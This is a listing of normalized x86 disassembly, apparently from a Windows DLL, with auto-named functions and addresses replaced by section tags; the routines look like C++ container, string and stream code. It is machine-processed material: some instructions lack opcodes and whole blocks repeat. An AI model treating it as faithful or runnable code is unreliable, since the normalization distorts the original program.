lea eax [ ebp - 0x64 ]
jbe r-xdata
call sub_1001325c
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
dec ebx
call sub_1001325c
call sub_10012f6a
push eax
mov eax esi
call sub_100135e3
dec [ ebp - 0x54 ]
jmp r-xdata
test edi edi
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1001325c
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_100138c2
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x64 ]
call sub_100130f6
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
jbe r-xdata
sub_1001343d
mov esi [ ebp - 0x80 ]
mov edi [ ebp - 0x78 ]
jmp r-xdata
cmp edi [ esi + 0x1c ]
jb r-xdata
call sub_100131fb
push 0x0
push 0x0
call sub_10027dd1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
call sub_100130f6
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_1000136c
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_10013685
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_10013818
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_100138c2
lea ecx [ ebp - 0x50 ]
add esp 0x14
push 0x0
push 0x1
call sub_10001500
jmp r-xdata
call sub_100130f6
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1001325c
call sub_10012f6a
push eax
mov eax esi
call sub_10013631
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_10013631
dec ebx
jmp r-xdata
call sub_100282fe
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_100130f6
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_100130f6
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
call sub_10012f6a
push eax
mov eax esi
call sub_10013631
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1001325c
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_100138c2
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
sub_100135cc
mov esi [ ebp - 0x80 ]
mov edi [ ebp - 0x78 ]
jmp r-xdata
cmp edi [ esi + 0x1c ]
jb r-xdata
call sub_1001322c
jmp r-xdata
push 0x0
push 0x0
call sub_10027dd1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
call sub_100130f6
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_1000136c
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_10013685
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_10013818
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_100138c2
lea ecx [ ebp - 0x50 ]
add esp 0x14
push 0x0
push 0x1
call sub_10001500
jmp r-xdata
call sub_100130f6
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1001325c
call sub_10012f6a
push eax
mov eax esi
call sub_10013631
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_10013631
dec ebx
jmp r-xdata
call sub_100282fe
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_100130f6
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_100130f6
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
call sub_10012f6a
push eax
mov eax esi
call sub_10013631
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1001325c
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_100138c2
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
sub_100135e3
push esi
mov esi eax
mov eax [ esi + 0x1c ]
inc eax
push edi
cmp [ esi + 0x14 ] eax
ja r-xdata
mov edi [ esi + 0x18 ]
test edi edi
jne r-xdata
call sub_100136b4
mov eax [ esi + 0x10 ]
dec edi
cmp [ eax + edi * 4 ] 0x0
jne r-xdata
mov edi [ esi + 0x14 ]
mov eax [ esi + 0x10 ]
push [ esp + 0xc ]
mov ecx [ eax + edi * 4 ]
call sub_100019c2
inc [ esi + 0x1c ]
mov [ esi + 0x18 ] edi
pop edi
pop esi
retn 0x4
xor ecx ecx
inc ecx
call sub_10001745
mov ecx [ esi + 0x10 ]
mov [ ecx + edi * 4 ] eax
sub_10013631
push esi
mov esi eax
mov eax [ esi + 0x1c ]
inc eax
push edi
cmp [ esi + 0x14 ] eax
ja r-xdata
mov eax [ esi + 0x18 ]
add eax [ esi + 0x1c ]
mov ecx [ esi + 0x14 ]
cmp ecx eax
ja r-xdata
call sub_100136b4
mov edi eax
mov eax [ esi + 0x10 ]
shl edi 0x2
cmp [ edi + eax ] 0x0
jne r-xdata
sub eax ecx
mov eax [ esi + 0x10 ]
push [ esp + 0xc ]
mov ecx [ eax + edi ]
call sub_100019c2
inc [ esi + 0x1c ]
pop edi
pop esi
retn 0x4
xor ecx ecx
inc ecx
call sub_10001745
mov ecx [ esi + 0x10 ]
mov [ edi + ecx ] eax
sub_10013685
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push ebx
mov ebx edx
push esi
neg ebx
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1001311c
mov eax [ ebp - 0x8 ]
mov [ edi ] eax
mov eax [ ebp - 0x4 ]
pop esi
mov [ edi + 0x4 ] eax
mov eax edi
pop ebx
leave
retn
sub_100136b4
push ebp
mov ebp esp
mov eax [ esi + 0x14 ]
sub esp 0x10
push ebx
mov edx 0x9249249
xor ebx ebx
mov ecx edx
inc ebx
sub ecx eax
push edi
cmp ecx ebx
jae r-xdata
mov ecx eax
shr ecx 0x1
cmp ecx 0x8
jae r-xdata
call sub_1001378d
cmp ecx ebx
jbe r-xdata
push 0x8
pop ecx
mov edi [ esi + 0x18 ]
lea ecx [ eax + ebx ]
mov [ ebp - 0x4 ] edi
call sub_100137cc
mov ecx [ esi + 0x10 ]
shl edi 0x2
mov [ ebp - 0x8 ] eax
lea edx [ edi + eax ]
mov eax [ esi + 0x14 ]
lea eax [ ecx + eax * 4 ]
add ecx edi
push ecx
call sub_10013907
pop ecx
mov ecx [ esi + 0x10 ]
mov edx eax
push ecx
cmp [ ebp - 0x4 ] ebx
ja r-xdata
sub edx ecx
cmp eax edx
ja r-xdata
lea eax [ ecx + ebx * 4 ]
call sub_10013907
mov edx [ ebp - 0x8 ]
pop ecx
mov ecx [ esi + 0x10 ]
lea eax [ ecx + edi ]
lea ecx [ ecx + ebx * 4 ]
push ecx
call sub_10013907
pop ecx
mov edi eax
test ebx ebx
jbe r-xdata
mov eax ebx
sub eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ecx + edi ]
call sub_10013907
pop ecx
mov ecx [ ebp - 0xc ]
mov edi eax
test ecx ecx
jbe r-xdata
mov ebx ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov ecx ebx
mov ecx [ ebp - 0x4 ]
test ecx ecx
jbe r-xdata
xor eax eax
[ edi ]
mov eax [ ebp - 0x8 ]
add [ esi + 0x14 ] ebx
pop edi
mov [ esi + 0x10 ] eax
pop ebx
leave
retn
push eax
call sub_100242e6
pop ecx
mov edi [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
[ edi ]
sub_1001378d
push 0x44
mov eax sub_1004d191
call sub_10028203
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001a6d
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_10027dd1
int3
sub_100137cc
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x4
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x2
push eax
call sub_10024389
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_100243ff
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10027dd1
int3
sub_10013818
push ebp
mov ebp esp
push ecx
push esi
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
test eax eax
je r-xdata
push [ ebp + 0x20 ]
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov eax [ eax ]
push esi
push edx
push ecx
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_1001392e
mov eax [ ebp + 0x8 ]
add esp 0x28
pop edi
pop esi
leave
retn
sub_1001386d
push ebp
mov ebp esp
push ecx
push esi
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
test eax eax
je r-xdata
push [ ebp + 0x20 ]
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov eax [ eax ]
push esi
push edx
push ecx
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_100139a7
mov eax [ ebp + 0x8 ]
add esp 0x28
pop edi
pop esi
leave
retn
sub_100138c2
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x10
push esi
mov esi [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
pop esi
leave
retn
lea eax [ ebp - 0xc ]
call sub_10012f6a
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx eax
call sub_10001450
inc [ ebp - 0x8 ]
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
sub_10013907
sub eax [ esp + 0x4 ]
push esi
sar eax 0x2
mov ecx eax
shl ecx 0x2
lea esi [ ecx + edx ]
test eax eax
jbe r-xdata
mov eax esi
pop esi
retn
push ecx
push [ esp + 0xc ]
push ecx
push edx
call sub_100245ce
add esp 0x10
sub_1001392e
push ebp
mov ebp esp
mov eax [ ebp + 0x24 ]
sub eax [ ebp + 0x1c ]
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov edx eax
lea eax [ ebp + 0x28 ]
call sub_10013685
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
dec esi
dec [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
call sub_10012f6a
mov ebx eax
lea eax [ ebp - 0x8 ]
call sub_10012f6a
push 0xffffffff
push 0x0
push ebx
mov ecx eax
call sub_10001450
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x2c ]
mov esi [ ebp + 0x24 ]
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] eax
cmp edi esi
je r-xdata
sub_100139a7
push ebp
mov ebp esp
mov eax [ ebp + 0x24 ]
sub eax [ ebp + 0x1c ]
sub esp 0x14
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx eax
lea eax [ ebp + 0x28 ]
call sub_1001325c
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
call sub_10012f6a
mov edi eax
lea eax [ ebp - 0x10 ]
call sub_10012f6a
push 0xffffffff
push 0x0
push edi
mov ecx eax
call sub_10001450
inc [ ebp - 0xc ]
inc [ ebp - 0x4 ]
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x2c ]
mov esi [ ebp + 0x24 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] esi
je r-xdata
sub_10013a23
push 0x0
mov eax sub_1004f3ba
call sub_10028203
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_1000d0d5
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
lea esi [ edi + 0x18 ]
mov [ edi ] r--data
call sub_10013c3f
pop ecx
push [ ebp + 0x10 ]
lea ecx [ edi + 0x34 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000136c
mov [ edi + 0x50 ] 0x0
and [ edi + 0x54 ] 0x0
and [ edi + 0x58 ] 0x0
mov eax edi
call sub_100282db
retn 0xc
sub_10013a90
push 0x4
mov eax sub_1004ea7f
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
call sub_10013d4d
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi + 0x58 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x34 ]
call sub_10001500
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_10001500
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d109
call sub_100282db
retn
call sub_10003d5c
sub_10013aec
push 0x48
mov eax sub_1004e254
call sub_10028203
mov ebx ecx
push 0x8
call sub_10024389
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor esi esi
lea ecx [ ebx + 0x18 ]
push ecx
mov esi eax
call sub_100183f8
mov esi eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] esi
call sub_10013f08
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_10001a27
add esp 0xc
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x10 ]
lea esi [ ebx + 0x54 ]
call sub_10003d36
lea eax [ ebp - 0x14 ]
cmp eax esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x18 ]
test ecx ecx
je r-xdata
call sub_10003d5c
push r--data
lea ecx [ ebp - 0x38 ]
call sub_10001c7f
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
push ecx
push eax
call sub_10015818
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x38 ]
mov edi eax
call sub_10002020
test edi edi
jne r-xdata
call sub_10003d5c
mov [ ebx + 0x50 ] 0x1
call edi
lea eax [ ebp - 0x1c ]
cmp eax esi
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001c7f
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
push ecx
push eax
call sub_10015818
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x54 ]
mov edi eax
call sub_10002020
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
and [ esi + 0x4 ] 0x0
test ecx ecx
je r-xdata
and [ esi ] 0x0
lea edi [ ebx + 0x34 ]
mov esi r--data
push esi
mov ecx edi
call sub_10010da6
test eax eax
je r-xdata
xor eax eax
call sub_100282db
retn
call sub_10003d5c
jmp r-xdata
push esi
mov ecx edi
call sub_100014e3
push edi
call sub_100161b2
pop ecx
sub_10013c3f
push 0x118
mov eax sub_1004f37f
call sub_1002826c
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x34 ] eax
cmp [ eax + 0x14 ] edi
ja r-xdata
push r--data
lea ecx [ ebp - 0x74 ]
call sub_1000134a
lea eax [ ebp - 0x30 ]
push eax
lea ebx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
call sub_10015ec7
pop ecx
push edi
xor edi edi
inc edi
push edi
mov ecx ebx
mov [ ebp - 0x4 ] 0x4
call sub_10001500
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x58 ]
call sub_10016092
push r--data
push eax
push esi
mov [ ebp - 0x4 ] 0x5
call sub_10004ab3
add esp 0xc
push 0x0
push edi
mov ecx ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x4 ] 0x4
call sub_10001500
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push r--data
lea ecx [ ebp - 0x58 ]
call sub_10001c7f
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x1
call sub_10002075
push r--data
lea eax [ ebp - 0x9c ]
push eax
call sub_10027dd1
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x124 ]
push eax
push 0x22
pop ecx
call sub_1001088b
push [ ebp - 0x34 ]
lea eax [ ebp - 0x124 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_10013d8f
pop ecx
pop ecx
lea eax [ ebp - 0x124 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000fb74
push 0x0
push edi
lea ecx [ ebp - 0x30 ]
call sub_10001500
mov eax esi
call sub_100282ef
retn
sub_10013d4d
push 0x4
mov eax sub_1004e217
call sub_10028236
mov esi ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x18 ]
push eax
call sub_100161b2
pop ecx
add esi 0x34
push r--data
mov ecx esi
call sub_10010da6
test eax eax
je r-xdata
call sub_100282db
retn
push esi
call sub_100161b2
pop ecx
sub_10013d8f
push 0x1c
mov eax sub_1004f320
call sub_10028236
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x18 ]
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x20 ] ecx
jle r-xdata
mov [ ebp - 0x18 ] ebx
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
sub eax ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
xor edi edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov edi esi
call sub_100053bb
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + esi + 0x28 ]
mov eax [ ebp + 0xc ]
call sub_10013f73
movzx eax [ eax ]
push eax
mov ecx ebx
call sub_1000c8c4
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov cl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x1c ] cl
push [ ebp - 0x1c ]
mov ecx eax
call sub_1000c8c4
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_1000d05d
mov eax esi
call sub_100282db
retn
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov [ eax + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
inc edi
xor ebx ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
xor ebx ebx
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov cl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov [ ebp + 0xc ] cl
push [ ebp + 0xc ]
mov ecx eax
call sub_1000c8c4
cmp eax 0xffffffff
jne r-xdata
cmp edi [ ebp - 0x20 ]
jae r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_10013ed6
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10013f08
push 0x4
mov eax sub_1004ca4f
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_10013f73
push esi
mov esi eax
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_10024832
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop esi
retn
sub_10013f93
push 0x0
mov eax sub_1004cf57
call sub_10028203
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10001fc2
push [ ebp + 0x10 ]
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000136c
push [ ebp + 0x14 ]
lea ecx [ esi + 0x3c ]
mov [ ebp - 0x4 ] 0x2
call sub_1000136c
push [ ebp + 0x18 ]
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000136c
push [ ebp + 0x1c ]
lea ecx [ esi + 0x74 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000136c
push [ ebp + 0x20 ]
lea ecx [ esi + 0x90 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000136c
mov eax esi
call sub_100282db
retn 0x1c
sub_1001402b
push ebx
push esi
push edi
mov esi ecx
xor ebx ebx
xor edi edi
push ebx
inc edi
push edi
lea ecx [ esi + 0x90 ]
mov [ esi ] r--data
call sub_10001500
push ebx
push edi
lea ecx [ esi + 0x74 ]
call sub_10001500
push ebx
push edi
lea ecx [ esi + 0x58 ]
call sub_10001500
push ebx
push edi
lea ecx [ esi + 0x3c ]
call sub_10001500
push ebx
push edi
lea ecx [ esi + 0x20 ]
call sub_10001500
push ebx
push edi
lea ecx [ esi + 0x4 ]
call sub_10002020
pop edi
mov [ esi ] r--data
pop esi
pop ebx
retn
sub_10014084
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004f2ee
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x1c ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov edi r--data
push edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0x24 ] eax
call sub_1000134a
xor ebx ebx
push edi
lea ecx [ esp + 0x44 ]
mov [ esp + 0x8c ] ebx
call sub_1000134a
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esi + 0x58 ]
lea edx [ esp + 0x44 ]
mov [ esp + 0x8c ] 0x1
call sub_1001850c
pop ecx
lea ecx [ esp + 0x14 ]
push ecx
mov ecx eax
call sub_10018837
mov edi r--data
mov [ esp + 0x14 ] edi
push ebx
push 0x1
